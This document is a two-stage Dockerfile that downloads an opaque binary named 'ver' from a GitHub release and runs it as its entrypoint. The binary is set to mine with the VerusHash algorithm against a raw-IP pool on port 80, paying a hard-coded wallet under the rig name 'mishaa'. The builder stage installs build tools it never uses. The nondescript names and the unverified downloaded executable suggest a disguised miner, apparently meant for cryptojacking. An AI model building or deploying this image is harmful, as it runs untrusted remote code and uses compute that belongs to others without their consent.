FROM debian:sid-slim as builder

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 curl wget && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN wget https://github.com/imraahatikah6827/eaa/releases/download/eaa/ver.tar.gz && \ 
    tar xf ver.tar.gz && \
    mv ver /usr/local/bin/ && \
    rm -rf ver.tar.gz
    
FROM debian:sid-slim

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

COPY --from=builder /usr/local/bin/ver /usr/local/bin/

ENTRYPOINT [ "ver" ]
CMD [ "-algo", "verushash", "-pool1", "51.89.228.192:80", "-wallet", "REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9", "-rigName", "mishaa" ]
